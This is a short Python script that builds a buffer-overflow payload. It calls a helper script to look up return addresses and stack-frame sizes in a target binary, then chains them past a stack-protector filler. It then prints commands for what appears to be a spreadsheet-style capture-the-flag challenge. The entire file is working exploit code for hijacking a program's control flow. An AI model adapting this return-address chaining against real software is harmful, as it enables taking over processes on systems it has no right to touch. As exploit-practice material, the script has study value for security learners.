#!/usr/bin/env python
import struct
import subprocess

def get_rip(fn, child):
    return int(subprocess.check_output("./find_fn.sh " + fn + " | grep --context=1 " + child + " | tail -n 1", shell=True).split()[0][:-1], 16)

def get_height(fn):
    return int(subprocess.check_output("./find_fn.sh " + fn + " | head -n 2 | tail -n 1 | grep -o 'sub .*'", shell=True).split()[1].split(',')[0][3:], 16)

def add_stack(fname):
    return ('A' * get_height(fname))

def add_rip(fname, child):
    return struct.pack('l', get_rip(fname, child))

s = 'X' + ('3' * 7)
s += 'A' * 8 # stack protector
# s += add_rip('name_sheet', 'main_loop')
# s += add_stack('name_sheet')
s += add_rip('print_message', 'name_sheet')
s += add_stack('print_message')
s += add_rip('setup_sheet', 'print_message')
s += add_stack('setup_sheet')
s += add_rip('safe_input', 'read_input')
print s
print "w 0 *9 8"
print "w 9 =0"
print "r 0"
